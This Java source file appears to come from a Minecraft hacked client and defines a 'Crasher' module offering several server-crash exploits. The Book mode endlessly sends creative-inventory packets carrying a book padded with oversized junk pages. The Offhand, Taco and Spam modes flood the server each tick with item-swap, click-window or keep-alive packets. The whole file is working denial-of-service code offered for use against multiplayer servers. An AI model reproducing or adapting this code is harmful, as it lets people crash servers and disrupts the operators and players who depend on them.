package dev.gavhack.module.mods;

import dev.gavhack.events.PlayerUpdateEvent;
import dev.gavhack.module.Category;
import dev.gavhack.module.Module;
import dev.gavhack.settings.EnumSetting;
import dev.gavhack.settings.FloatSetting;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketKeepAlive;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class Crasher extends Module {

    private final EnumSetting<CrashMode> crashMode = new EnumSetting<>("Mode", CrashMode.Offhand);
    private final FloatSetting offhandSpeed = new FloatSetting("OffhandSpeed", 500.0f, 0.0f, 1000.0f);

    public Crasher() {
        super("Crasher", "Various crash exploits", Category.OTHER);
    }

    private Thread crashThread;

    @Override
    protected void onEnable() {
        if (crashMode.getValue() == CrashMode.Book) {
            crashThread = new Thread(() -> {
                try {
                    ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                    NBTTagList list = new NBTTagList();
                    NBTTagCompound tag = new NBTTagCompound();
                    String author = mc.getSession().getUsername();
                    String title = "Title";
                    String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    for (int i = 0; i < 50; ++i) {
                        NBTTagString tString = new NBTTagString(size);
                        list.appendTag(tString);
                    }
                    tag.setString("author", author);
                    tag.setString("title", title);
                    tag.setTag("pages", list);
                    bookObj.setTagInfo("pages", list);
                    bookObj.setTagCompound(tag);
                    do {
                        mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                        Thread.sleep(12L);
                    } while (true);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
            crashThread.start();
        }
    }

    @Override
    protected void onDisable() {
        if (crashThread.isAlive())
            crashThread.interrupt();
    }

    @SubscribeEvent
    public void onTick(PlayerUpdateEvent event) {
        if (crashMode.getValue() == CrashMode.Offhand) {
            for (int i = 0; i < this.offhandSpeed.getValue(); ++i) {
                final BlockPos playerBlock = new BlockPos(mc.player.posX, mc.player.posY - 1.0, mc.player.posZ);
                mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
            }
        } else if (crashMode.getValue() == CrashMode.Taco) {
            for (int i = 0; i < 1000; i++) {
                final ItemStack item = new ItemStack(mc.player.getHeldItemMainhand().getItem());
                final CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
                mc.player.connection.sendPacket(packet);
            }
        } else {
            for (int i = 0; i < 5; i++) {
                mc.player.connection.sendPacket(new CPacketKeepAlive());
            }
        }
    }

    @Override
    public String getExtraInfo() {
        return "[" + crashMode.getValue().name() + "]";
    }

    private enum CrashMode {
        Offhand,
        Taco,
        Spam,
        Book
    }
}
